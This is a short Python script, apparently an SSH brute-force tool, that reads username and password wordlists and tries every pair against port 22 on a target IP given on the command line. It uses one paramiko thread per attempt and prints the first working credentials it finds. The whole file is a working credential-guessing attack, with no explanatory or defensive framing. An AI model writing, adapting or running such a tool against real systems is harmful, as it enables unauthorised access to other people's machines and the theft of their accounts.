import paramiko, sys, os, socket, threading, time
import itertools,string,crypt

ip = sys.argv[1]
users = open('users', 'r')
passwords = open('passwords', 'r')

found = 0

def attempt(user, password):
    global found

    if found:
        return

    try:
        ssh = paramiko.SSHClient()
        ssh.load_system_host_keys()
        ssh.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())
        

        try:
            ssh.connect(ip, port=22, username=user ,password=password, timeout=1)


        except paramiko.AuthenticationException:
            return
        except socket.error:
            return
        except paramiko.SSHException:
            return
        except Exception:
            return

        print("Found correct creds:", user, password)
        found = 1
        ssh.close()


    except:
        pass



    return



def main():
    global found
    password_list = [p.strip() for p in passwords]
    user_list = [u.strip() for u in users]
    
    for u in user_list:
        for p in password_list:
            t = threading.Thread(target=attempt, args=(u, p,))
            t.start()
            if found:
                return

    return


main()

users.close()
passwords.close()

